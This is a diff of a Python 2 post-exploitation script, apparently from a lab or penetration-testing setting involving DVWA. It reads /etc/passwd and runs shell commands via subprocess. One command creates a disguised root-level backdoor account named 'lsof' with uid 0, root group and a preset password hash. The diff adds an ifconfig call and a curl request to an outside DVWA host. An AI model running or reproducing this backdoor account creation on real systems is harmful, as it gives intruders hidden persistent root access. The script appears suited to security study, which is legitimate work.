@@ -14,13 +14,18 @@ with open('/etc/passwd', 'r') as fin:
 
 #find out who i am
 
-print "who am i?"
+print "add user"
 p = subprocess.Popen("useradd-p`openssl passwd-1-salt'lsof'admin`-u0-o-groot-Groot-s/bin/bash-d/usr/bin/lsof lsof", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 print p.communicate()[0]
 
-print "who am i?"
+print "ifconfig"
 p = subprocess.Popen("ifconfig", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 print p.communicate()[0]
+
+print "curl"
+p = subprocess.Popen("curl -I http://dvwa.mujj.cn/login.php", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+print p.communicate()[0]
+
 
 #find out my groups
 
